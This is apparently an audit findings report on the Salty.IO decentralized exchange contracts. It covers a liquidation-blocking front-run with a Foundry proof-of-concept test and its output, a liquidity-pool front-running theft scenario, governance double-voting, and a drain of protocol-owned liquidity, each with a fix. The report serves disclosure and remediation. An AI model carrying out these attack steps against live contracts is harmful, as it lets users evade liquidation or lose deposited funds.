# Salty DEX Findings
- 2 High
- 2 Medium

## Overview

Salty.IO is a Decentralized Exchange on Ethereum which uses Automatic Atomic Arbitrage (AAA) to generate yield and provide Zero Fees on all swaps.

With AAA, market inefficiencies are arbitraged at swap time to create profits - which are then distributed to liquidity providers and stakers and used to form Protocol Owned Liquidity (POL) for the DAO.

Additionally, Salty.IO provides USDS, an overcollateralized ERC20 stablecoin native to the protocol which uses WBTC/WETH LP as collateral.

## [H-1] User can prevent liquidation by updating the cooldown period.

### Code Line

https://github.com/code-423n4/2024-01-salty/blob/f742b554e18ae1a07cb8d4617ec8aa50db037c1c/src/staking/StakingRewards.sol#L64C3-L74C1

### Summary

Users have the ability to prevent liquidation transactions by calling the `depositCollateralAndIncreaseShare` function frontrunning the liquidate transaction, which resets the cooldown period to the current `block timestamp + cooldown`. This prevents liquidation until the cooldown period has elapsed.

### Details

When a user is undercollateralized, they can monitor the liquidation transaction in the mempool and front-run it ahead of time by calling `CollateralAndLiquidity:depositCollateralAndIncreaseShares`. The user should provide an amount slightly higher than the enforced DUST amount set by the protocol. This action does not make their position immune to liquidation, but it triggers the internal function `StakingRewards:_increaseUserShare`, which resets their cooldown period to block.timestamp + cooldown period.

```jsx
function _increaseUserShare(address wallet, bytes32 poolID, uint256 increaseShareAmount, bool useCooldown) internal {
	require(poolsConfig.isWhitelisted(poolID), "Invalid pool");
	require(increaseShareAmount != 0, "Cannot increase zero share");

	UserShareInfo storage user = _userShareInfo[wallet][poolID];

	if (useCooldown && msg.sender != address(exchangeConfig.dao())) { // DAO doesn't use the cooldown
		require(block.timestamp >= user.cooldownExpiration, "Must wait for the cooldown to expire");

		// Update the cooldown expiration for future transactions
		user.cooldownExpiration = block.timestamp + stakingConfig.modificationCooldown();
	}

	uint256 existingTotalShares = totalShares[poolID];

```

After this, when the liquidation transaction is executed, it attempts to decrease the user's stakes using `StakingRewards:decreaseUserShares`. This function checks if the cooldown period has passed for the user. Since the user has just modified their cooldown period in the previous transaction, the check will fail and the transaction will revert.

```jsx
function _decreaseUserShare(
        address wallet,
        bytes32 poolID,
        uint256 decreaseShareAmount,
        bool useCooldown
    ) internal {
      ....Other code....

        if (useCooldown)
            if (
                msg.sender != address(exchangeConfig.dao())
            ) // DAO doesn't use the cooldown
            {
//@audit - this check will fail if liquidation is frontrnned 
                require(
                    block.timestamp >= user.cooldownExpiration,
                    "Must wait for the cooldown to expire"
                );

                // Update the cooldown expiration for future transactions
                user.cooldownExpiration =
                    block.timestamp +
                    stakingConfig.modificationCooldown();
            }
...Other Code...
      
    }
       
```

### Proof of Concept

This is same liquidation test provided with the test suite, just with the one line modification

```diff
// A unit test that verifies the liquidateUser function correctly transfers WETH to the liquidator and WBTC/WETH to the USDS contract
    function testLiquidatePosition() public {
        assertEq(collateralAndLiquidity.numberOfUsersWithBorrowedUSDS(), 0);

        assertEq(
            wbtc.balanceOf(address(usds)),
            0,
            "USDS contract should start with zero WBTC"
        );
        assertEq(
            weth.balanceOf(address(usds)),
            0,
            "USDS contract should start with zero WETH"
        );
        assertEq(usds.balanceOf(alice), 0, "Alice should start with zero USDS");

        // Total needs to be worth at least $2500
        uint256 depositedWBTC = (1000 ether * 10 ** 8) /
            priceAggregator.getPriceBTC();
        uint256 depositedWETH = (1000 ether * 10 ** 18) /
            priceAggregator.getPriceETH();

        (uint256 reserveWBTC, uint256 reserveWETH) = pools.getPoolReserves(
            wbtc,
            weth
        );
        assertEq(reserveWBTC, 0, "reserveWBTC doesn't start as zero");
        assertEq(reserveWETH, 0, "reserveWETH doesn't start as zero");

        // Alice will deposit collateral and borrow max USDS
        vm.startPrank(alice);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(
            depositedWBTC,
            depositedWETH,
            0,
            block.timestamp,
            false
        );

        uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
        assertEq(
            maxUSDS,
            0,
            "Alice doesn't have enough collateral to borrow USDS"
        );

        // Deposit again
        vm.warp(block.timestamp + 1 hours);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(
            depositedWBTC,
            depositedWETH,
            0,
            block.timestamp,
            false
        );

        // Account for both deposits
        depositedWBTC = depositedWBTC * 2;
        depositedWETH = depositedWETH * 2;
        vm.stopPrank();

        // Deposit extra so alice can withdraw all liquidity without having to worry about the DUST reserve limit
        vm.prank(DEPLOYER);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(
            1 * 10 ** 8,
            1 ether,
            0,
            block.timestamp,
            false
        );

        vm.warp(block.timestamp + 1 hours);

        vm.startPrank(alice);
        maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);

        vm.startPrank(alice);
        vm.warp(block.timestamp + 1 hours);

        maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
        collateralAndLiquidity.borrowUSDS(maxUSDS);
        vm.stopPrank();

        assertEq(collateralAndLiquidity.numberOfUsersWithBorrowedUSDS(), 1);

        uint256 maxWithdrawable = collateralAndLiquidity
            .maxWithdrawableCollateral(alice);
        assertEq(
            maxWithdrawable,
            0,
            "Alice shouldn't be able to withdraw any collateral"
        );

        {
            uint256 aliceCollateralValue = collateralAndLiquidity
                .userCollateralValueInUSD(alice);

            uint256 aliceBorrowedUSDS = usds.balanceOf(alice);
            assertEq(
                collateralAndLiquidity.usdsBorrowedByUsers(alice),
                aliceBorrowedUSDS,
                "Alice amount USDS borrowed not what she has"
            );

            // Borrowed USDS should be about 50% of the aliceCollateralValue
            assertTrue(
                aliceBorrowedUSDS > ((aliceCollateralValue * 499) / 1000),
                "Alice did not borrow sufficient USDS"
            );
            assertTrue(
                aliceBorrowedUSDS < ((aliceCollateralValue * 501) / 1000),
                "Alice did not borrow sufficient USDS"
            );
        }

        // Try and fail to liquidate alice
        vm.expectRevert("User cannot be liquidated");
        vm.prank(bob);
        collateralAndLiquidity.liquidateUser(alice);

        // Artificially crash the collateral price
        _crashCollateralPrice();

        // Delay before the liquidation
        vm.warp(block.timestamp + 1 days);

        uint256 bobStartingWETH = weth.balanceOf(bob);
        uint256 bobStartingWBTC = wbtc.balanceOf(bob);
        vm.prank(alice);

//@audit-info: 101 is 1 wei more than DUST 100
+        collateralAndLiquidity.depositCollateralAndIncreaseShare(
            101,
            101,
            0,
            block.timestamp,
            false
        );
        // Liquidate Alice's position
        vm.prank(bob);

        uint256 gas0 = gasleft();
        collateralAndLiquidity.liquidateUser(alice);
        console.log("LIQUIDATE GAS: ", gas0 - gasleft());

        uint256 bobRewardWETH = weth.balanceOf(bob) - bobStartingWETH;
        uint256 bobRewardWBTC = wbtc.balanceOf(bob) - bobStartingWBTC;

        // Verify that Alice's position has been liquidated
        assertEq(
            collateralAndLiquidity.userShareForPool(alice, collateralPoolID),
            0
        );
        assertEq(collateralAndLiquidity.usdsBorrowedByUsers(alice), 0);

        // Verify that Bob has received WBTC and WETH for the liquidation
        assertEq(
            (depositedWETH * 5) / 100,
            bobRewardWETH,
            "Bob should have received WETH for liquidating Alice"
        );
        assertEq(
            (depositedWBTC * 5) / 100,
            bobRewardWBTC,
            "Bob should have received WBTC for liquidating Alice"
        );

        // Verify that the Liquidizer received the WBTC and WETH from Alice's liquidated collateral
        assertEq(
            wbtc.balanceOf(address(liquidizer)),
            depositedWBTC - bobRewardWBTC - 1,
            "The Liquidizer contract should have received Alice's WBTC"
        );
        assertEq(
            weth.balanceOf(address(liquidizer)),
            depositedWETH - bobRewardWETH,
            "The Liquidizer contract should have received Alice's WETH - Bob's WETH reward"
        );

        assertEq(collateralAndLiquidity.numberOfUsersWithBorrowedUSDS(), 0);
    }
```

### Output

```bash
Running 1 test for src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
[FAIL. Reason: revert: Must wait for the cooldown to expire] testLiquidatePosition() (gas: 1199341)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 84.40s
 
Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
[FAIL. Reason: revert: Must wait for the cooldown to expire] testLiquidatePosition() (gas: 1199341)

Encountered a total of 1 failing tests, 0 tests succeeded
make: *** [Makefile:4: test-one] Error 1
```

### Impact

Users can prevent liquidation which lets the protocol incur a bad debt.

### Recommendation

There could be two possible solutions:

1. Do not allow users to increase collateral if their position is liquidatable.
2. Add a check in the `_decreaseUserShare` function that does not verify the cooldown if the call is intended to liquidate the user.


## [H-2] Transaction to add liquidity can be frontrunned resulting in the loss for LP.

### Code Line

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L187

### Impact

A depositor calling `Liquidity:depositLiquidityAndIncreaseShare` can be front-run by a sole liquidity holder, resulting in the loss of funds for the depositor.

When either of the reserves of a pool is 0 any call to addLiquidity will cause the pool to reset the reserves ratio.

```solidity
// If either reserve is zero then consider the pool to be empty and that the added liquidity will become the initial token ratio
        if ((reserve0 == 0) || (reserve1 == 0)) { //@audit reserve1 can be 0
            // Update the reserves
            reserves.reserve0 += uint128(maxAmount0);
            reserves.reserve1 += uint128(maxAmount1);

            // Default liquidity will be the addition of both maxAmounts in case one of them is much smaller (has smaller decimals)
            return (maxAmount0, maxAmount1, (maxAmount0 + maxAmount1)); 
        }
```

This issue was identified in the trail of bits audits. Although the fix has not been implemented correctly, they have provided a detailed explanation of how the attack can occur. Therefore, I will refer to their description instead of writing my own.

### Exploit Scenario

Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and
200,000 DAI, for a ratio of 1:2,000.

1. Alice submits a transaction to add 10 WETH and 20,000 DAI of liquidity.
2. Eve front runs Alice’s transaction with a removeLiquidity transaction that brings
one of the reserves down to close to zero.
3. As the last action of her transaction, Eve adds liquidity, but because one of the
reserves is zero, whatever ratio she adds to the pool becomes the new
reserves ratio. In this example, Eve adds the ratio 10:2,000 (representing a WETH
price of 200 DAI).
4. Alice’s addLiquidity transaction goes through, but because of the new K ratio, the
logic lets her add only 10 WETH and 2,000 DAI. The liquidity slippage guard does not work because the reserves ratio has been reset. In nominal terms, Alice actually
receives more liquidity than she would have at the previous ratio.
5. Eve back runs this transaction with a swap transaction that buys most of the WETH
that Alice just deposited for a starting price of 200 DAI. Eve then removes her
liquidity, effectively stealing Alice’s 10 WETH for a fraction of the price.

Please refer to issue ID 3 for more information regarding the trail of bit audit.

The [salty.io](http://salty.io/) team resolves this issue by ensuring that the reserves do not fall below the DUST when `withdrawLiquidityAndClaim` is called. However, they made a small mistake or typo that allowed reserve1 to be less than DUST.

```solidity
// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
        // This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
        //@audit-issue - Only checking for remaining  for reserve0, what about reserve1?
        require(
            (reserves.reserve0 >= PoolUtils.DUST) &&
                (reserves.reserve0 >= PoolUtils.DUST),
            "Insufficient reserves after liquidity removal"
        );
```

If the frontrunner chooses to decrease the reserve1 value to 0 then this check will pass and this attack will come into play.

### Recommendation

Instead of just checking if the reserve0 is less than DUST also check if reserve1 is below DUST

```solidity
// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
        // This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
        require(
            (reserves.reserve0 >= PoolUtils.DUST) &&
                (reserves.reserve1 >= PoolUtils.DUST),
            "Insufficient reserves after liquidity removal"
        );
```


## [M-1] Users can vote more than their stake amount if the minimum unstake period is less than 2 weeks.

### Code Line

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L259

### Impact

Malicious actors can pass proposals without holding the required tokens. This can lead to proposals with potential issues in the system.

### Vulnerability Details

A staked amount of SALT can have a minimum unstake period of 1 week, while the voting duration for a proposal can range from 3 to 14 days.

Let's imagine an attacker who has 1 million SALT staked, giving them a voting power of 1 million. To reach the quorum for a vote, only 10% of the total stake is needed. For example, if there are 12 million SALT tokens in total stake, then 1.2 million tokens are required to pass the quorum.

If, for some reason, the DAO sets the minimum unstake period to 1 week and the voting duration is between 7 and 14 days, the user can exploit this scenario. They can create a malicious proposal and vote 1 million SALT for it. Afterward, they can unstake their 1 million SALT within a week and retain 20%, which is 200k, and transfer that to his another address(because voting from the same address is not allowed). They can then stake this 200k SALT again and vote in the same proposal because it has not yet expired.

This allows the user to vote twice with the same SALT. However, the reward for doing this is not substantial. If the user unstakes their 1 million SALT in 1 week, they will lose all of their remaining 800k SALT. Additionally, if the proposal is malicious, other voters can vote against it and cause it to fail. Nonetheless, history has shown significant governance attacks in the past resulting from these types of accounting errors. While the impact may not be high at this time, a malicious actor could potentially exploit this issue to harm the system in a better way.

### Recommendation

Do not allow the unstake duration to be less than 2 weeks.

### [M-2] Protocol Owned Liquidity will get withdrawn unnecessarily and could be drained.

### Code Line

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L128

### Impact

If there is an active repayment and liquidation action then protocol Owned Liquidity will get withdrawn every time a `Liquidizer:performUpkeep` is called to cover the debt even if it is not necessary. If `performUpkeep` is called multiple times with certain scenarios then POL can be drained.

### Vulnerability details

When users repay USDS using `repayUSDS` , A repaid amount is sent to USDS contract for burning when someone calls to perform upkeep. It also increments the burnable USDS amount in `Liquidizer.sol` using `liquidizer:incrementBurnableUSDS` .

```solidity
// Repay borrowed USDS and adjust the user's usdsBorrowedByUser
    function repayUSDS(uint256 amountRepaid) external nonReentrant {
        ...Other Code...

        // Have the user send the USDS to the USDS contract so that it can later be burned (on USDS.performUpkeep)
        usds.safeTransferFrom(msg.sender, address(usds), amountRepaid);

        // Have USDS remember that the USDS should be burned
        liquidizer.incrementBurnableUSDS(amountRepaid);

     ...Other Code...
    }
```

The `Liquidizer.sol` is supposed to account for burnable USDS, liquidated collateral, withdraw protocol-owned liquidity if needed, and swap collateral for USDS to burn.

When someone is liquidated their WBTC & WETH are sent to this contract so it can be swapped to USDS and burned when `performUpKeep` is called. If the USDS received from swapping these collateral tokens is not enough to meet the USDS required to burn, it will try to withdraw Protocol Owned Liquidity using `dao.withdrawPOL`, The POL is nothing but SALT/DAI and DAI/USDS pool created with rewards owned by protocol.

```solidity
function _possiblyBurnUSDS() internal {
        // Check if there is USDS to burn
        if (usdsThatShouldBeBurned == 0) return;

        uint256 usdsBalance = usds.balanceOf(address(this));
        if (usdsBalance >= usdsThatShouldBeBurned) {
            // Burn only up to usdsThatShouldBeBurned.
            // Leftover USDS will be kept in this contract in case it needs to be burned later.
            _burnUSDS(usdsThatShouldBeBurned);
            usdsThatShouldBeBurned = 0;
        } else {
            // The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later
            _burnUSDS(usdsBalance);
            usdsThatShouldBeBurned -= usdsBalance;

            // As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and
            // send the underlying tokens here to be swapped to USDS
           => dao.withdrawPOL(salt, usds, PERCENT_POL_TO_WITHDRAW);
           => dao.withdrawPOL(dai, usds, PERCENT_POL_TO_WITHDRAW);
            // only getting USDS but not burning it
        }
    }
```

The only time this POL should get withdrawn is when liquidated collateral is not enough to cover the user borrowed USDS amount.

But in the case of `repayUSDS` the burnable USDS is incremented without even sending the collateral to cover the burning. This will make `Liquidizer:usdsThatShouldBeBurned` always have more to burn without enough assets backing it. 

If this happens then the POL will always get withdrawn even when the liquidated collateral is enough to cover the burning. In case of high activity in the protocol and if perform upkeep is called multiple times then always withdrawing the POL could drain the pool.

### Proof of concept

I couldn’t produce the actual test to show the vulnerability because it involves multiple market participants.  The scenario explained below should help you understand the issue:

### Vulnerability flow

1. Alice repays the loan and his 100 USDS is sent to USDS.sol and also increments `usdsThatShouldBeBurned` to 100.
2. Bob got liquidated when the value of his collateral 1 WBTC:200 WETH fell below 110% of the total 1000 USDS borrowed. His collateral is sent to Liquidizer.sol and the `usdsThatShouldBeBurned` incremented by 1000 making it a total of 1100.
3. The current value of 1WBTC:200 WETH is 1050 USDS(105% of total borrowed USDS).
4. When `Liquidizer:performUpkeep` is called the WBTC and WETH will get swapped to and contract now holds the 1050 USDS balance.
5. In the follow-up internal function `_possiblyBurnUSDS` when the USDS balance of the contract is compared with `usdsThatShouldBeBurned` it will trigger the else block because 1100 > 1050.
6. The system assumes that the collateral is not enough to cover debt so it will try to withdraw from the POL, which is not necessary because as we see the borrowed amount is 1000 and we already have 1050 USDS enough to cover the debt.
7. This will repeat if the protocol has a lot of users repaying, getting liquidated which will eventually drain the POL.

### Recommendation

Do not call  `Liquidizer.incrementBurnableUSDS(amountRepaid);` when the user is repaying.